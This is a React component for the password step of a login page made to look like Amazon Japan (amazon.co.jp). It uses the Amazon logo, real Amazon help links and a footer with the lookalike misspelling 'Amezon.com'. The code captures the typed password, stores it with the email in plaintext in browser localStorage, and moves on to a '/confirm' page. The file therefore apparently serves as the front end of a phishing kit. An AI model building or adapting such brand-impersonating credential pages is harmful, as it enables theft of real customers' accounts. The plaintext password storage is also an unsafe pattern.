import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  Box,
  Typography,
  TextField,
  Button,
  Link,
  Divider,
} from "@mui/material";

const LoginPass = () => {
  const navigate = useNavigate();
  const [savedEmail, setSavedEmail] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    const emailFromStorage = localStorage.getItem("savedText") || "";
    const passwordFromStorage = localStorage.getItem("savedPassword") || "";
    setSavedEmail(emailFromStorage);
    setPassword(passwordFromStorage);
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!password.trim()) {
      alert("パスワードを入力してください。");
      return;
    }

    // 保存
    localStorage.setItem("savedText", savedEmail);
    localStorage.setItem("savedPassword", password);

    // ページ遷移（React Router 使用）
    navigate("/confirm"); // ← ルーティング先を適切に設定
  };

  return (
    <Box
      sx={{
        maxWidth: 350,
        mx: "auto",
        mt: 5,
        p: 3,
        border: "1px solid #ddd",
        borderRadius: 2,
        boxShadow: "0 0 5px rgba(0,0,0,0.1)",
        fontFamily: "Arial, sans-serif",
      }}
    >
      {/* ロゴ */}
      <Box display="flex" alignItems="center" justifyContent="center" mb={2}>
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"
          alt="Amazon ロゴ"
          style={{ height: 40, marginRight: 8 }}
        />
        <Typography fontSize={16}>.co.jp</Typography>
      </Box>

      {/* タイトル */}
      <Typography variant="h5" mb={2} textAlign="center">
        ログイン
      </Typography>

      {/* 表示用メールアドレス */}
      <Box display="flex" alignItems="center" justifyContent="space-between" mb={2}>
        <Typography>{savedEmail || "メールが未設定です"}</Typography>
        <Link href="/login">変更</Link>
      </Box>

      {/* パスワード入力 */}
      <form onSubmit={handleSubmit}>
        <TextField
          type="password"
          label="パスワード"
          variant="outlined"
          size="small"
          fullWidth
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          sx={{ mb: 2 }}
        />

        <Link
          href="https://www.amazon.co.jp/ap/forgotpassword"
          target="_blank"
          rel="noopener noreferrer"
          sx={{ display: "block", mb: 2, fontSize: 14 }}
        >
          パスワードを忘れた方
        </Link>

        <Button
          type="submit"
          variant="contained"
          fullWidth
          sx={{
            bgcolor: "#ffd500",
            color: "black",
            borderRadius: 2,
            height: 40,
            fontSize: 14,
            textTransform: "none",
            "&:hover": {
              bgcolor: "#ffc400",
            },
            mb: 3,
          }}
        >
          ログイン
        </Button>
      </form>

      <Divider sx={{ mb: 2 }} />

      {/* フッターリンク */}
      <Box textAlign="center" fontSize={12} color="gray">
        <Box mb={1}>
          <Link
            href="https://www.amazon.co.jp/gp/help/customer/display.html?nodeId=643006"
            target="_blank"
            rel="noopener noreferrer"
            sx={{ mx: 1 }}
          >
            利用規約
          </Link>
          |
          <Link
            href="https://www.amazon.co.jp/gp/help/customer/display.html?nodeId=643000"
            target="_blank"
            rel="noopener noreferrer"
            sx={{ mx: 1 }}
          >
            プライバシー規約
          </Link>
          |
          <Link
            href="https://www.amazon.co.jp/help"
            target="_blank"
            rel="noopener noreferrer"
            sx={{ mx: 1 }}
          >
            ヘルプ
          </Link>
        </Box>
        <Typography variant="caption">
          © 1996-2024, Amezon.com, Inc. またはその関連会社
        </Typography>
      </Box>
    </Box>
  );
};

export default LoginPass;
